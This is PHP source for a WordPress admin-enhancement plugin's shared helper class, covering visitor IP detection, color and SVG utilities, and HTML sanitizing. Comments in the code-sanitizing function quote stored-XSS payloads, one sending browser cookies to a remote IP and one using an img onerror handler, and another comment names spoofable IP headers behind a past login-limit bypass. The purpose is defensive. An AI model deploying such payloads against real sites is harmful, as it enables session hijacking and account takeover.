<?php

namespace ASENHA\Classes;

use WP_Query;
/**
 * Class that provides common methods used throughout the plugin
 *
 * @since 2.5.0
 */
class Common_Methods {
    /**
     * Get IP of the current visitor/user. In use by at least the Limit Login Attempts feature.
     * This takes a best guess of the visitor's actual IP address.
     * Takes into account numerous HTTP proxy headers due to variations
     * in how different ISPs handle IP addresses in headers between hops.
     *
     * @link https://stackoverflow.com/q/1634782
     * @since 2.5.0
     */
    public function get_user_ip_address( $return_type = 'ip', $for_which_module = 'limit-login-attempts' ) {
        $options = get_option( ASENHA_SLUG_U, array() );
        $ip_address_header = '';
        switch ( $for_which_module ) {
            case 'limit-login-attempts':
                $ip_address_header = ( isset( $options['limit_login_attempts_header_override'] ) ? trim( $options['limit_login_attempts_header_override'] ) : '' );
                break;
            case 'password-protection':
                $ip_address_header = ( isset( $options['password_protection_header_override'] ) ? trim( $options['password_protection_header_override'] ) : '' );
                break;
        }
        // Attempt to get IP address with the preferred header
        if ( !empty( $ip_address_header ) && isset( $_SERVER[$ip_address_header] ) ) {
            // Check if multiple IP addresses exist in var
            $ip_list = explode( ',', $_SERVER[$ip_address_header] );
            if ( is_array( $ip_list ) && count( $ip_list ) > 1 ) {
                foreach ( $ip_list as $ip ) {
                    switch ( $return_type ) {
                        case 'ip':
                            if ( $this->is_ip_valid( trim( $ip ) ) ) {
                                return sanitize_text_field( trim( $ip ) );
                            } else {
                                return '0.0.0.0';
                                // placeholder IP address
                            }
                            break;
                        case 'header':
                            return $ip_address_header . ' (multiple IP addresses)';
                            break;
                    }
                }
            } else {
                switch ( $return_type ) {
                    case 'ip':
                        if ( $this->is_ip_valid( trim( $_SERVER[$ip_address_header] ) ) ) {
                            return sanitize_text_field( $_SERVER[$ip_address_header] );
                        } else {
                            return '0.0.0.0';
                            // placeholder IP address
                        }
                        break;
                    case 'header':
                        return $ip_address_header;
                        break;
                }
            }
        }
        // The following request headers can be modified by user or attacker when sending a request, so, will bypass an already blocked IP
        // 'HTTP_CLIENT_IP', 'CF_CONNECTING_IP', 'HTTP_CF_CONNECTING_IP', 'HTTP_CF_CONNECTING_IP', 'TRUE_CLIENT_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED'
        // Reported as security vulnerability in ASE <= v7.6.7.1 -- Limit Login Attempt Bypass via IP Spoofing
        // Return unreliable but unspoofable IP address coming from the $_SERVER global as the default / fallback
        switch ( $return_type ) {
            case 'ip':
                if ( $this->is_ip_valid( trim( $_SERVER['REMOTE_ADDR'] ) ) ) {
                    return sanitize_text_field( $_SERVER['REMOTE_ADDR'] );
                } else {
                    return '0.0.0.0';
                    // placeholder IP address
                }
                break;
            case 'header':
                return 'REMOTE_ADDR';
                break;
        }
    }

    /**
     * Check if the supplied IP address is valid or not
     * 
     * @param  string  $ip an IP address
     * @link https://stackoverflow.com/q/1634782
     * @return boolean		true if supplied address is valid IP, and false otherwise
     */
    public function is_ip_valid( $ip ) {
        if ( empty( $ip ) ) {
            return false;
        }
        // Ref: https://www.php.net/manual/en/filter.filters.validate.php
        // Ref: https://www.php.net/manual/en/filter.constants.php#constant.filter-validate-ip
        // No need to specify which IP type to filter/check, e.g. filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 )
        // This should check for both IPv4 and IPv6 addresses
        if ( false === filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 ) && false === filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6 ) ) {
            return false;
        }
        if ( false !== filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 ) || false !== filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6 ) ) {
            return true;
        }
    }

    /**
     * Convert number of seconds into hours, minutes, seconds. In use by at least the Limit Login Attempts feature.
     *
     * @since 2.5.0
     */
    public function seconds_to_period( $seconds, $conversion_type ) {
        $period_start = new \DateTime('@0');
        $period_end = new \DateTime("@{$seconds}");
        if ( $conversion_type == 'to-days-hours-minutes-seconds' ) {
            return $period_start->diff( $period_end )->format( '%a days, %h hours, %i minutes and %s seconds' );
        } elseif ( $conversion_type == 'to-hours-minutes-seconds' ) {
            return $period_start->diff( $period_end )->format( '%h hours, %i minutes and %s seconds' );
        } elseif ( $conversion_type == 'to-minutes-seconds' ) {
            return $period_start->diff( $period_end )->format( '%i minutes and %s seconds' );
        } else {
            return $period_start->diff( $period_end )->format( '%a days, %h hours, %i minutes and %s seconds' );
        }
    }

    /**
     * Remove html tags and content inside the tags from a string
     *
     * @since 3.0.3
     */
    public function strip_html_tags_and_content( $string ) {
        // Strip HTML tags and content inside them. Ref: https://stackoverflow.com/a/39320168
        if ( !is_null( $string ) ) {
            if ( false === strpos( $string, 'fs-submenu-item' ) ) {
                $string = preg_replace( '@<(\\w+)\\b.*?>.*?</\\1>@si', '', $string );
            }
            // Strip any remaining HTML or PHP tags
            $string = strip_tags( $string );
        }
        return $string;
    }

    /**
     * Extract readable text from a string that may contain HTML.
     *
     * Unlike strip_html_tags_and_content(), this method keeps the text inside tags,
     * e.g. it will turn `<span><img ...>Paymattic</span>` into `Paymattic`.
     *
     * @since 8.0.2
     *
     * @param string|null $html A string that may contain HTML.
     * @return string Readable plain text (may be empty).
     */
    public function extract_readable_text_from_html( $html ) {
        if ( null === $html ) {
            return '';
        }
        $text = wp_strip_all_tags( (string) $html, true );
        $charset = get_bloginfo( 'charset' );
        if ( empty( $charset ) ) {
            $charset = 'UTF-8';
        }
        $text = html_entity_decode( $text, ENT_QUOTES, $charset );
        $text = preg_replace( '/\\s+/u', ' ', $text );
        return trim( $text );
    }

    /**
     * Get menu hidden by toggle
     * 
     * @since 5.1.0
     */
    public function get_menu_hidden_by_toggle() {
        $menu_hidden_by_toggle = array();
        $options_extra = get_option( ASENHA_SLUG_U . '_extra', array() );
        $options = ( isset( $options_extra['admin_menu'] ) ? $options_extra['admin_menu'] : array() );
        if ( array_key_exists( 'custom_menu_hidden', $options ) ) {
            $menu_hidden = $options['custom_menu_hidden'];
            $menu_hidden = explode( ',', $menu_hidden );
            $menu_hidden_by_toggle = array();
            foreach ( $menu_hidden as $menu_id ) {
                $menu_hidden_by_toggle[] = $this->restore_menu_item_id( $menu_id );
            }
        }
        return $menu_hidden_by_toggle;
    }

    /**
     * Get user capabilities for which the "Show All/Less" menu toggle should be shown for
     * 
     * @since 5.1.0
     */
    public function get_user_capabilities_to_show_menu_toggle_for() {
        global $menu, $submenu;
        $menu_always_hidden = array();
        $user_capabilities_menus_are_hidden_for = array();
        $menu_hidden_by_toggle = $this->get_menu_hidden_by_toggle();
        // indexed array
        foreach ( $menu as $menu_key => $menu_info ) {
            foreach ( $menu_hidden_by_toggle as $hidden_menu_id ) {
                if ( false !== strpos( $menu_info[4], 'wp-menu-separator' ) ) {
                    $menu_item_id = $menu_info[2];
                } else {
                    $menu_item_id = $menu_info[5];
                }
                if ( $menu_item_id == $hidden_menu_id ) {
                    $user_capabilities_menus_are_hidden_for[] = $menu_info[1];
                }
            }
        }
        $user_capabilities_menus_are_hidden_for = array_unique( $user_capabilities_menus_are_hidden_for );
        return $user_capabilities_menus_are_hidden_for;
        // indexed array
    }

    /**
     * Transform menu item's ID
     * 
     * @since 5.1.0
     */
    public function transform_menu_item_id( $menu_item_id ) {
        // Transform e.g. edit.php?post_type=page ==> edit__php___post_type____page
        $menu_item_id_transformed = str_replace( array(
            ".",
            "?",
            "=/",
            "=",
            "&",
            "/",
            ";"
        ), array(
            "__",
            "___",
            "_______",
            "____",
            "_____",
            "______",
            "________"
        ), $menu_item_id );
        return $menu_item_id_transformed;
    }

    /**
     * Transform menu item's ID
     * 
     * @since 5.1.0
     */
    public function restore_menu_item_id( $menu_item_id_transformed ) {
        // Transform e.g. edit__php___post_type____page ==> edit.php?post_type=page
        $menu_item_id = str_replace( array(
            "________",
            "_______",
            "______",
            "_____",
            "____",
            "___",
            "__"
        ), array(
            ";",
            "=/",
            "/",
            "&",
            "=",
            "?",
            "."
        ), $menu_item_id_transformed );
        return $menu_item_id;
    }

    /**
     * Sanitize hexedecimal numbers used for colors
     *
     * @link https://plugins.trac.wordpress.org/browser/bm-custom-login/trunk/bm-custom-login.php
     * @param string $color Hex number to sanitize.
     * @return string
     */
    public function sanitize_hex_color( $color ) {
        if ( '' === $color ) {
            return '';
        }
        // Make sure the color starts with a hash.
        $color = '#' . ltrim( $color, '#' );
        // 3 or 6 hex digits, or the empty string.
        if ( preg_match( '|^#([A-Fa-f0-9]{3}){1,2}$|', $color ) ) {
            return $color;
        }
        return null;
    }

    /**
     * Get the post ID of the most recent post in a custom post type
     * 
     * @since 6.4.1
     */
    public function get_most_recent_post_id( $post_type ) {
        $args = array(
            'post_type'      => $post_type,
            'posts_per_page' => 1,
            'orderby'        => 'date',
            'order'          => 'DESC',
        );
        $query = new WP_Query($args);
        if ( $query->have_posts() ) {
            $query->the_post();
            $post_id = get_the_ID();
            wp_reset_postdata();
            return $post_id;
        }
        return 0;
        // Return 0 if no posts found
    }

    /**
     * Extended ruleset for wp_kses() that includes SVG tag and it's children
     * 
     * @since 6.8.3
     */
    public function get_kses_extended_ruleset() {
        $kses_defaults = wp_kses_allowed_html( 'post' );
        // For SVG icons
        $svg_args = array(
            'svg'    => array(
                'class'           => true,
                'aria-hidden'     => true,
                'aria-labelledby' => true,
                'role'            => true,
                'xmlns'           => true,
                'width'           => true,
                'height'          => true,
                'viewbox'         => true,
                'viewBox'         => true,
            ),
            'g'      => array(
                'fill'            => true,
                'fill-rule'       => true,
                'stroke'          => true,
                'stroke-width'    => true,
                'stroke-linejoin' => true,
                'stroke-linecap'  => true,
            ),
            'title'  => array(
                'title' => true,
            ),
            'path'   => array(
                'd'               => true,
                'fill'            => true,
                'stroke'          => true,
                'stroke-width'    => true,
                'stroke-linejoin' => true,
                'stroke-linecap'  => true,
            ),
            'rect'   => array(
                'width'           => true,
                'height'          => true,
                'x'               => true,
                'y'               => true,
                'rx'              => true,
                'ry'              => true,
                'fill'            => true,
                'stroke'          => true,
                'stroke-width'    => true,
                'stroke-linejoin' => true,
                'stroke-linecap'  => true,
            ),
            'circle' => array(
                'cx'              => true,
                'cy'              => true,
                'r'               => true,
                'stroke'          => true,
                'stroke-width'    => true,
                'stroke-linejoin' => true,
                'stroke-linecap'  => true,
            ),
        );
        $kses_with_extras = array_merge( $kses_defaults, $svg_args );
        // For embedded PDF viewer
        $style_script_args = array(
            'style'  => true,
            'script' => array(
                'src' => true,
            ),
        );
        return array_merge( $kses_with_extras, $style_script_args );
    }

    /**
     * Get the singular label from a $post object
     * 
     * @since 6.9.3
     */
    function get_post_type_singular_label( $post ) {
        $post_type_singular_label = '';
        if ( property_exists( $post, 'post_type' ) ) {
            $post_type_object = get_post_type_object( $post->post_type );
            if ( is_object( $post_type_object ) && property_exists( $post_type_object, 'label' ) ) {
                $post_type_singular_label = $post_type_object->labels->singular_name;
            }
        }
        return $post_type_singular_label;
    }

    function is_in_block_editor() {
        $current_screen = get_current_screen();
        if ( method_exists( $current_screen, 'is_block_editor' ) && $current_screen->is_block_editor() ) {
            return true;
        } else {
            return false;
        }
    }

    /**
     * Check if WooCommerce is active
     * 
     * @since 6.9.9
     */
    public function is_woocommerce_active() {
        if ( function_exists( 'is_plugin_active' ) && is_plugin_active( 'woocommerce/woocommerce.php' ) ) {
            return true;
        } else {
            return false;
        }
    }

    /**
     * Convert HEX color to RGBA
     * 
     * @link https://stackoverflow.com/a/31934345
     * @since 7.0.0
     */
    public function hex_to_rgba( $hex, $alpha = false ) {
        $hex = str_replace( '#', '', trim( $hex ) );
        $length = strlen( $hex );
        $rgb['r'] = hexdec( ( $length == 6 ? substr( $hex, 0, 2 ) : (( $length == 3 ? str_repeat( substr( $hex, 0, 1 ), 2 ) : 0 )) ) );
        $rgb['g'] = hexdec( ( $length == 6 ? substr( $hex, 2, 2 ) : (( $length == 3 ? str_repeat( substr( $hex, 1, 1 ), 2 ) : 0 )) ) );
        $rgb['b'] = hexdec( ( $length == 6 ? substr( $hex, 4, 2 ) : (( $length == 3 ? str_repeat( substr( $hex, 2, 1 ), 2 ) : 0 )) ) );
        if ( false !== $alpha ) {
            $rgb['a'] = $alpha;
        }
        // Return array of r, g, b and a
        // return $rgb;
        // Return rgb(255,255,255) or rgba(255,255,255,.5)
        return implode( array_keys( $rgb ) ) . '(' . implode( ', ', $rgb ) . ')';
    }

    /**
     * Increases or decreases the brightness of a color by a percentage of the current brightness.
     *
     * @param   string  $hex        Supported formats: `#FFF`, `#FFFFFF`, `FFF`, `FFFFFF`
     * @param   float   $adjustment_percentage  A number between -1 and 1. E.g. 0.3 = 30% lighter; -0.4 = 40% darker.
     *
     * @return  string
     *
     * @link 	https://stackoverflow.com/a/54393956
     * @author  maliayas
     */
    function adjust_bnrightness( $hex, $adjustment_percentage ) {
        $hex = ltrim( $hex, '#' );
        if ( strlen( $hex ) == 3 ) {
            $hex = $hex[0] . $hex[0] . $hex[1] . $hex[1] . $hex[2] . $hex[2];
        }
        $hex = array_map( 'hexdec', str_split( $hex, 2 ) );
        foreach ( $hex as &$color ) {
            $adjustableLimit = ( $adjustment_percentage < 0 ? $color : 255 - $color );
            $adjustAmount = ceil( $adjustableLimit * $adjustment_percentage );
            $color = str_pad(
                dechex( $color + $adjustAmount ),
                2,
                '0',
                STR_PAD_LEFT
            );
        }
        return '#' . implode( $hex );
    }

    /**
     * Detect if a color is light or dark
     * 
     * @link https://stackoverflow.com/a/12228730
     * @since 7.0.0
     */
    public function is_color_dark( $hex ) {
        $hex = str_replace( '#', '', trim( $hex ) );
        $r = hexdec( $hex[0] . $hex[1] );
        $g = hexdec( $hex[2] . $hex[3] );
        $b = hexdec( $hex[4] . $hex[5] );
        $lightness = (max( $r, $g, $b ) + min( $r, $g, $b )) / 510.0;
        // HSL algorithm
        if ( $lightness > 0.8 ) {
            return false;
        } else {
            return true;
        }
    }

    /**
     * Return SVG for small triangle in place of using &#9654; HTMl character
     * which may be converted to emoticon by the browser or app
     * 
     * @since 7.2.0
     */
    public function get_svg_triangle() {
        return '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 16 16"><path fill="currentColor" d="M14.222 6.687a1.5 1.5 0 0 1 0 2.629l-10 5.499A1.5 1.5 0 0 1 2 13.5V2.502a1.5 1.5 0 0 1 2.223-1.314z"/></svg>';
    }

    /**
     * Get intrinsic width/height dimensions from a local SVG file.
     *
     * Some SVGs use percentage width/height attributes (e.g. width="100%" height="100%").
     * In those cases, a correct aspect ratio should be derived from the viewBox instead.
     *
     * @since 9.2.0
     *
     * @param string $svg_path Absolute path to a local SVG file.
     * @return array{width:int,height:int} Intrinsic dimensions if known, otherwise 0/0.
     */
    public function get_svg_intrinsic_dimensions_from_file( $svg_path ) {
        $dims = array(
            'width'  => 0,
            'height' => 0,
        );
        $svg_path = (string) $svg_path;
        if ( '' === $svg_path ) {
            return $dims;
        }
        $ext = strtolower( (string) pathinfo( $svg_path, PATHINFO_EXTENSION ) );
        if ( 'svg' !== $ext ) {
            return $dims;
        }
        if ( !file_exists( $svg_path ) ) {
            return $dims;
        }
        // Safely parse SVG XML without allowing network access.
        $prev_internal_errors = libxml_use_internal_errors( true );
        $svg = simplexml_load_file( $svg_path, 'SimpleXMLElement', LIBXML_NONET | LIBXML_NOCDATA );
        libxml_clear_errors();
        libxml_use_internal_errors( $prev_internal_errors );
        if ( false === $svg ) {
            return $dims;
        }
        $attributes = $svg->attributes();
        $width_raw = ( isset( $attributes->width ) ? trim( (string) $attributes->width ) : '' );
        $height_raw = ( isset( $attributes->height ) ? trim( (string) $attributes->height ) : '' );
        $view_box = ( isset( $attributes->viewBox ) ? trim( (string) $attributes->viewBox ) : '' );
        $length_dims = $this->parse_svg_width_height_pair( $width_raw, $height_raw );
        if ( $length_dims['width'] > 0 && $length_dims['height'] > 0 ) {
            return $length_dims;
        }
        $vb_dims = $this->parse_svg_viewbox_dimensions( $view_box );
        if ( $vb_dims['width'] > 0 && $vb_dims['height'] > 0 ) {
            return $vb_dims;
        }
        return $dims;
    }

    /**
     * Parse SVG width/height attributes when both values are absolute lengths.
     *
     * If either value is percentage-based (contains "%") or otherwise not parseable as an
     * absolute length, return 0/0 so callers can fall back to viewBox.
     *
     * @since 9.2.0
     *
     * @param string $width_raw  Raw `width` attribute value.
     * @param string $height_raw Raw `height` attribute value.
     * @return array{width:int,height:int}
     */
    private function parse_svg_width_height_pair( $width_raw, $height_raw ) {
        $dims = array(
            'width'  => 0,
            'height' => 0,
        );
        $width_raw = (string) $width_raw;
        $height_raw = (string) $height_raw;
        if ( '' === $width_raw || '' === $height_raw ) {
            return $dims;
        }
        // Percentage sizes are not intrinsic dimensions.
        if ( false !== strpos( $width_raw, '%' ) || false !== strpos( $height_raw, '%' ) ) {
            return $dims;
        }
        $width_parsed = $this->parse_svg_absolute_length_value( $width_raw );
        $height_parsed = $this->parse_svg_absolute_length_value( $height_raw );
        if ( empty( $width_parsed['value'] ) || empty( $height_parsed['value'] ) ) {
            return $dims;
        }
        // Require matching units (treat empty as px) to avoid having to convert.
        $width_unit = ( isset( $width_parsed['unit'] ) ? (string) $width_parsed['unit'] : '' );
        $height_unit = ( isset( $height_parsed['unit'] ) ? (string) $height_parsed['unit'] : '' );
        if ( $width_unit !== $height_unit ) {
            return $dims;
        }
        $w = (float) $width_parsed['value'];
        $h = (float) $height_parsed['value'];
        if ( $w <= 0 || $h <= 0 ) {
            return $dims;
        }
        $dims['width'] = (int) round( $w );
        $dims['height'] = (int) round( $h );
        return $dims;
    }

    /**
     * Parse SVG viewBox dimensions.
     *
     * @since 9.2.0
     *
     * @param string $view_box Raw `viewBox` attribute value.
     * @return array{width:int,height:int}
     */
    private function parse_svg_viewbox_dimensions( $view_box ) {
        $dims = array(
            'width'  => 0,
            'height' => 0,
        );
        $view_box = trim( (string) $view_box );
        if ( '' === $view_box ) {
            return $dims;
        }
        $parts = preg_split( '/[\\s,]+/', $view_box );
        if ( !is_array( $parts ) ) {
            return $dims;
        }
        $parts = array_values( array_filter( $parts, 'strlen' ) );
        if ( count( $parts ) < 4 ) {
            return $dims;
        }
        $vb_w = floatval( $parts[2] );
        $vb_h = floatval( $parts[3] );
        if ( $vb_w <= 0 || $vb_h <= 0 ) {
            return $dims;
        }
        $dims['width'] = (int) round( $vb_w );
        $dims['height'] = (int) round( $vb_h );
        return $dims;
    }

    /**
     * Parse an SVG length attribute as an absolute value and unit.
     *
     * Supports unitless values and common absolute units used in SVG. Percentage values
     * are rejected earlier by the caller.
     *
     * @since 9.2.0
     *
     * @param string $raw Raw attribute value.
     * @return array{value:float,unit:string}|array{} Empty array if not parseable.
     */
    private function parse_svg_absolute_length_value( $raw ) {
        $raw = trim( (string) $raw );
        if ( '' === $raw ) {
            return array();
        }
        if ( !preg_match( '/^\\s*([0-9]*\\.?[0-9]+)\\s*(px|pt|pc|mm|cm|in|q)?\\s*$/i', $raw, $matches ) ) {
            return array();
        }
        $value = floatval( $matches[1] );
        if ( $value <= 0 ) {
            return array();
        }
        $unit = ( isset( $matches[2] ) ? strtolower( (string) $matches[2] ) : '' );
        // Normalize empty unit to px (SVG/CSS default).
        if ( '' === $unit ) {
            $unit = 'px';
        }
        return array(
            'value' => $value,
            'unit'  => $unit,
        );
    }

    /**
     * Get an image URL from an ASE setting field, which could be an internal relative URL or an external URL
     * 
     * @since 7.2.1
     */
    public function get_image_url( $ase_settings_field_name ) {
        $options = get_option( ASENHA_SLUG_U, array() );
        if ( isset( $options[$ase_settings_field_name] ) ) {
            if ( false === strpos( $options[$ase_settings_field_name], 'http' ) && false !== strpos( $options[$ase_settings_field_name], '/uploads/' ) ) {
                $logo_image = content_url() . $options[$ase_settings_field_name];
            } else {
                // $maybe_valid_url = filter_var( $options['admin_logo_image'], FILTER_SANITIZE_URL );
                $maybe_valid_url = sanitize_url( $options[$ase_settings_field_name], array('http', 'https') );
                if ( false !== filter_var( $maybe_valid_url, FILTER_VALIDATE_URL ) ) {
                    $logo_image = $maybe_valid_url;
                } else {
                    $logo_image = '';
                }
            }
        } else {
            $logo_image = '';
        }
        return $logo_image;
    }

    /**
     * Get current URL, without query parameters and without trailing slash
     * e.g. https://www.site.com/some-page
     *
     * @return string
     */
    public function get_current_url() {
        $output = '';
        $url = (( is_ssl() ? 'https://' : 'http://' )) . sanitize_text_field( $_SERVER['HTTP_HOST'] ) . sanitize_text_field( $_SERVER['REQUEST_URI'] );
        $url_parts = explode( '?', $url, 2 );
        // limit to max of 2 elements with last element containing the rest of the string
        if ( isset( $url_parts[0] ) ) {
            $output = trim( $url_parts[0], '/' );
        }
        return ( $output ? urldecode( $output ) : '/' );
    }

    /**
     * Get full URL, with query parameters
     * e.g. https://www.site.com/some-page?param=value
     * 
     * @link https://stackoverflow.com/a/6768831
     * @since 7.8.18
     */
    public function get_full_url() {
        $full_url = (( empty( $_SERVER['HTTPS'] ) ? 'http' : 'https' )) . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
        return $full_url;
    }

    /**
     * Get array of elements with value of true
     * 
     * @since 7.6.10
     */
    public function get_array_of_keys_with_true_value( $array_with_true_false_values ) {
        $array_of_keys_with_true_value = array();
        if ( is_array( $array_with_true_false_values ) && count( $array_with_true_false_values ) > 0 ) {
            foreach ( $array_with_true_false_values as $key => $value ) {
                if ( $value ) {
                    $array_of_keys_with_true_value[] = $key;
                }
            }
            return $array_of_keys_with_true_value;
        } else {
            return array();
            // default, empty array
        }
    }

    /**
     * Sanitize user-submitted code from potential security vulnerabilities
     * 
     * @since 7.8.7
     */
    public function sanitize_html_js_css_code( $code ) {
        $code_lines = explode( PHP_EOL, $code );
        $sanitized_code_lines = array();
        foreach ( $code_lines as $code_line ) {
            if ( false !== strpos( $code_line, 'src=' ) && false !== strpos( $code_line, 'document.cookie' ) ) {
                // Do nothing. Do not include the code line in the sanitized code.
                // Example of malicious code:
                // 1. Stored XSS vulnerability: <script>new Image().src='http://10.5.7.89:8001/index.php?c='+document.cookie</script>
                // This line of code will send cookies from users browser to a remote server for exploitation
            } else {
                if ( false !== strpos( $code_line, '<img' ) && false !== strpos( $code_line, 'src=' ) && false !== strpos( $code_line, 'onerror' ) ) {
                    // Do nothing. Do not include the code line in the sanitized code.
                    // Example of malicious code:
                    // 1. Stored XSS vulnerability: <img src=x onerror=alert(1)>
                    // This may entail account takeover backdoor
                } else {
                    $sanitized_code_lines[] = $code_line;
                }
            }
        }
        $sanitized_code = implode( PHP_EOL, $sanitized_code_lines );
        return $sanitized_code;
    }

    /**
     * Part of Disable Embeds module
     * Remove all rewrite rules related to embeds.
     * During deactivation / activation.
     *
     * @link https://plugins.trac.wordpress.org/browser/disable-embeds/tags/1.5.0/disable-embeds.php#L86
     * @since 8.0.0
     *
     * @param array $rules WordPress rewrite rules.
     * @return array Rewrite rules without embeds rules.
     */
    public function disable_embeds_rewrites( $rules ) {
        foreach ( $rules as $rule => $rewrite ) {
            if ( false !== strpos( $rewrite, 'embed=true' ) ) {
                unset($rules[$rule]);
            }
        }
        return $rules;
    }

    /**
     * Get an indexed array of public post type slug => label pairs
     * 
     * @since 8.0.1
     */
    public function get_public_post_type_slugs() {
        $asenha_public_post_types = array();
        $public_post_type_names = get_post_types( array(
            'public' => true,
        ), 'names' );
        foreach ( $public_post_type_names as $post_type_name ) {
            $post_type_object = get_post_type_object( $post_type_name );
            $asenha_public_post_types[$post_type_name] = $post_type_object->label;
        }
        asort( $asenha_public_post_types );
        // sort by value, ascending
        return $asenha_public_post_types;
    }

}
